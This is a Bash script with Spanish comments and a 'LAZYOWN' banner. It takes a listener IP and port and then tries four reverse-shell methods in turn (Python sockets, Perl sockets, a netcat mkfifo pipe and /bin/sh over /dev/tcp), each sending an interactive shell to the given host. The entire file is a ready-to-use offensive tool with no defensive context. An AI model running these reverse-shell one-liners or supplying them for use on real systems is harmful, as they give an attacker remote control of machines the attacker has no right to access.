#!/bin/bash

# Banner
echo "██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗"
echo "██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║"
echo "██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║"
echo "██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║"
echo "███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║"
echo "╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝"

# Función para mostrar ayuda
function mostrar_ayuda {
    echo "Uso: $0 --ip IP --puerto PUERTO"
    echo ""
    echo "Opciones:"
    echo "  --ip       IP del servidor de escucha"
    echo "  --puerto   Puerto del servidor de escucha"
    exit 1
}

# Validar dirección IP
function validar_ip {
    local ip=$1
    local valid_regex='^([0-9]{1,3}\.){3}[0-9]{1,3}$'
    if [[ $ip =~ $valid_regex ]]; then
        for segment in $(echo $ip | tr "." "\n"); do
            if ((segment < 0 || segment > 255)); then
                return 1
            fi
        done
        return 0
    else
        return 1
    fi
}

# Comprobación de parámetros
if [[ $# -lt 4 ]]; then
    mostrar_ayuda
fi

# Procesamiento de parámetros
while [[ $# -gt 0 ]]; do
    case $1 in
        --ip)
            IP="$2"
            if ! validar_ip "$IP"; then
                echo "[-] IP inválida: $IP"
                exit 1
            fi
            shift 2
            ;;
        --puerto)
            PUERTO="$2"
            if ! [[ $PUERTO =~ ^[0-9]+$ ]] || (( PUERTO < 1 || PUERTO > 65535 )); then
                echo "[-] Puerto inválido: $PUERTO"
                exit 1
            fi
            shift 2
            ;;
        *)
            mostrar_ayuda
            ;;
    esac
done

# Probar reverse shell en Python
echo "[+] Intentando reverse shell en Python..."
if command -v python > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shel python"
    python -c "import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"$IP\",$PUERTO)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);" && exit
fi

# Probar reverse shell en Perl
echo "[+] Intentando reverse shell en Perl..."
if command -v perl > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shel perl"
    perl -e 'use Socket;$i="'$IP'";$p='$PUERTO';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' && exit
fi

# Probar reverse shell en Netcat
echo "[+] Intentando reverse shell en Netcat..."
if command -v nc > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shel nc"
    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $IP $PUERTO > /tmp/f && exit
fi

# Probar reverse shell en Shell
echo "[+] Intentando reverse shell en Shell..."
if command -v sh > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shel en shell"
    /bin/sh -i >& /dev/tcp/$IP/$PUERTO 0>&1 && exit
fi

echo "[-] No se pudo establecer una conexión reverse shell con ninguna de las herramientas disponibles."
